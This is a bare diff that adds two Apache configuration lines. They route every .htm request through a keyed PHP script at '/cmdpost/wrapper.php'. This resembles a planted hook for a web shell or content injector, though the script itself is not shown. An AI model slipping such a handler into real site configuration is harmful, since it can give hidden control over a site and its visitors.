@@ -1,0 +1,4 @@
+AddHandler IceBox/htm-parse .htm
+Action IceBox/htm-parse  "/cmdpost/wrapper.php?key=125sdgsdfg4mn4580zlgmk34Kl&file="
+
+
